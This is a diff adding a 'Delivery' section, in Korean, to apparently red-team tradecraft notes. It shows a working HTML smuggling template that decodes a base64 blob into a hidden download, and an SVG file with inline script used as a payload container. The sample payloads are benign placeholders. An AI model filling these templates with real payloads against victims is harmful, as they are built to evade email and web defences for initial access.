@@ -209,6 +209,71 @@ $ python3 PackMyPayload.py -H decoy.xlsx,payload.xlam /mnt/c/Payloads/xlam /mnt/
 ### Delivery
 ---
 
+배포는 피해자가 초기 접근 시 패키지를 다운로드하도록 유도하는 방법이다. 과거에는 링크나 첨부 파일을 보내는 것만으로도 충분했지만, 보안이 강홛죔에 따라 이렇나 방식은 더이상 효과적이지 않다. 
+기업들은 보안 투자 비용을 초기 단계, 특히 경계 방어에 집중하는 경향이 있어 방화벽, 이메일 게이트웨이, 웹 프록시 등 여러 계층의 경계 보안 시스템을 구축하고, 공격 패키지는 이러한 보안 시스템을 모두 통과해야 한다. 
+
+#### HTML Smuggling
+
+``` html
+<html>
+    <head>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/brands.min.css">
+    </head>
+    <body>
+        <button class="btn" onclick="downloadFile()"><i class="fa fa-download"></i> Download</button>
+
+        <script>
+            function convertFromBase64(base64) {
+                let binary_string = window.atob(base64);
+                let len = binary_string.length;
+                let bytes = new Uint8Array(len);
+                for (let i = 0; i < len; i++) {
+                    bytes[i] = binary_string.charCodeAt(i);
+                }
+                return bytes.buffer;
+            }
+
+            function downloadFile() {
+                const file = 'VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
+                const fileName = 'test.txt';
+                let data = convertFromBase64(file);
+                let blob = new Blob([data], {type: 'octet/stream'});
+                if (window.navigator.msSaveOrOpenBlob) {
+                    window.navigator.msSaveBlob(blob,fileName);
+                }
+                else {
+                    const a = document.createElement('a');
+                    document.body.appendChild(a);
+                    a.style = 'display: none';
+                    const url = window.URL.createObjectURL(blob);
+                    a.href = url;
+                    a.download = fileName;
+                    a.click();
+                    window.URL.revokeObjectURL(url);
+                }
+            }
+        </script>
+    </body>
+</html>
+```
+
+파일의 내용을 base64로 인코딩되어 저장하고, 페이지가 로드될 때 피해자의 브라우저에는 인코딩된 페이로드가 저장됨 이후 버튼을 클릭하면 `downloadFile` 함수가 실행되어 base64 디코딩 후 바이너리 파일을 외부 트래픽 요청 없이 다운로드한다. 
+
+
+#### SVG Smuggling
+
+``` xml
+<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
+<circle cx="50" cy="50" r="40" stroke="black" stroke-width="4" fill="none" />
+<script>
+    alert('Hello World');
+</script>
+Sorry, your browser does not support inline SVG.
+</svg> 
+```
+
+Edge와 같은 브라우저에서 SVG 파일이 자바스크립트가 실행이 가능한 점을 이용하여 `.svg` 파일 형식을 페이로드 컨테이너로 사용이 가능
+
 
 ## Persistence
 
